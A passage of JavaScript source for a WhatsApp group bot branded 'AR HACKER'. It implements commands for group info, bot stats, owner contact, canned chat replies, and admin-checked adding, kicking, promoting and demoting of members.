                    await sock.sendMessage(remoteJid, { text: "This command only works in groups!" });
                    return;
                }
                const metadata = await getGroupMetadata(sock, remoteJid);
                if (!metadata) return;
                
                const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
                const isBotAdmin = metadata.participants.some(p => p.id === botId && (p.admin === 'admin' || p.admin === 'superadmin'));
                
                // Get group admins
                const admins = metadata.participants
                    .filter(p => p.admin === 'admin' || p.admin === 'superadmin')
                    .map(p => p.id.split('@')[0]);
                
                let adminList = "";
                if (admins.length > 0) {
                    adminList = "\n👑 *Admins:*\n";
                    for (let i = 0; i < Math.min(admins.length, 10); i++) {
                        adminList += `   ${i+1}. +${admins[i]}\n`;
                    }
                    if (admins.length > 10) {
                        adminList += `   ... and ${admins.length - 10} more\n`;
                    }
                } else {
                    adminList = "\n👑 *Admins:* No admins found\n";
                }
                
                const info = `📊 *Group Information*
                
📛 *Name:* ${metadata.subject}
👥 *Members:* ${metadata.participants.length}
🤖 *Bot Admin:* ${isBotAdmin ? '✅ Yes' : '❌ No'}
👑 *Total Admins:* ${admins.length}
🔒 *Setting:* ${metadata.announce ? 'Muted' : 'Unmuted'}
📝 *Description:* ${metadata.desc || 'No description'}${adminList}`;
                await sock.sendMessage(remoteJid, { text: info });
            }

            // 24. BOT INFO COMMAND
            if (command === 'botinfo') {
                const stats = await getBotStats(sock);
                const uptime = process.uptime();
                const hours = Math.floor(uptime / 3600);
                const minutes = Math.floor((uptime % 3600) / 60);
                
                // Calculate total unique admins
                const allAdmins = new Set();
                for (const group of stats.groupList) {
                    group.admins.forEach(admin => allAdmins.add(admin));
                }
                
                const info = `🤖 *AR HACKER BOT INFO*
                
⚡ *Status:* Online
👑 *Owner:* AR HACKER
⏱️ *Uptime:* ${hours}h ${minutes}m
📱 *Platform:* Node.js
💻 *Version:* 2.0.0
📊 *Total Groups:* ${stats.totalGroups}
👑 *Total Admins:* ${allAdmins.size}`;
                await sock.sendMessage(remoteJid, { text: info });
            }

            // 25. HELP COMMAND
            if (command === 'help') {
                await sock.sendMessage(remoteJid, { text: "Use .menu for main menu!" });
            }

            // 26. OWNER COMMAND
            if (command === 'owner') {
                await sock.sendMessage(remoteJid, { text: "👑 *Owner:* AR HACKER\n📞 *Contact:* 923403643259" });
            }

            // 27. CHAT COMMAND
            if (command === 'chat') {
                const responses = [
                    "Ji AR HACKER, main aapka hukum manne ke liye tayyar hoon!",
                    "Yes boss! How can I help you?",
                    "I'm here! What do you need?",
                    "At your service! 💪",
                    "AR HACKER Bot is ready! 🚀"
                ];
                const randomResponse = responses[Math.floor(Math.random() * responses.length)];
                await sock.sendMessage(remoteJid, { text: randomResponse });
            }

            // 28. ADD/KICK/PROMOTE/DEMOTE (with proper admin checks)
            if (['kick', 'add', 'promote', 'demote'].includes(command)) {
                if (!isGroup) {
                    await sock.sendMessage(remoteJid, { text: "❌ This command only works in groups!" });
                    return;
                }
                
                // Check if user is admin or owner
                if (!senderIsAdmin && !isOwner) {
                    await sock.sendMessage(remoteJid, { text: "❌ Only admins can use this command!" });
                    return;
                }

                switch (command) {
                    case 'add':
                        if (!text) {
                            await sock.sendMessage(remoteJid, { text: "❌ Please provide a number: .add 923xxxxxxxxx" });
                            return;
                        }
                        let num = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                        try {
                            await sock.groupParticipantsUpdate(remoteJid, [num], "add");
                            await sock.sendMessage(remoteJid, { text: "✅ Member added successfully!" });
                        } catch (error) {
                            await sock.sendMessage(remoteJid, { text: "❌ Failed to add member!" });
                        }
                        break;
                    case 'kick':
                        if (!target) {
                            await sock.sendMessage(remoteJid, { text: "❌ Please reply to a member's message or mention them!" });
                            return;
                        }
                        try {
                            await sock.groupParticipantsUpdate(remoteJid, [target], "remove");
                            await sock.sendMessage(remoteJid, { text: "✅ Member kicked successfully!" });
                        } catch (error) {
                            await sock.sendMessage(remoteJid, { text: "❌ Failed to kick member!" });
                        }
                        break;
                    case 'promote':
                        if (!target) {
                            await sock.sendMessage(remoteJid, { text: "❌ Please reply to a member's message or mention them!" });
                            return;
                        }
                        try {
                            await sock.groupParticipantsUpdate(remoteJid, [target], "promote");
                            await sock.sendMessage(remoteJid, { text: "✅ Member promoted to admin!" });
                        } catch (error) {
                            await sock.sendMessage(remoteJid, { text: "❌ Failed to promote member!" });
                        }
                        break;
                    case 'demote':
                        if (!target) {
                            await sock.sendMessage(remoteJid, { text: "❌ Please reply to a member's message or mention them!" });
                            return;
                        }
                        try {
                            await sock.groupParticipantsUpdate(remoteJid, [target], "demote");
                            await sock.sendMessage(remoteJid, { text: "✅ Admin demoted successfully!" });
                        } catch (error) {
                            await sock.sendMessage(remoteJid, { text: "❌ Failed to demote admin!" });
                        }
                        break;
                }
            }

        } catch (err) {
            console.log(err);
            try {
                await sock.sendMessage(remoteJid, { text: "❌ An error occurred!" });
            } catch (e) {}
        }
    });
}

startBot();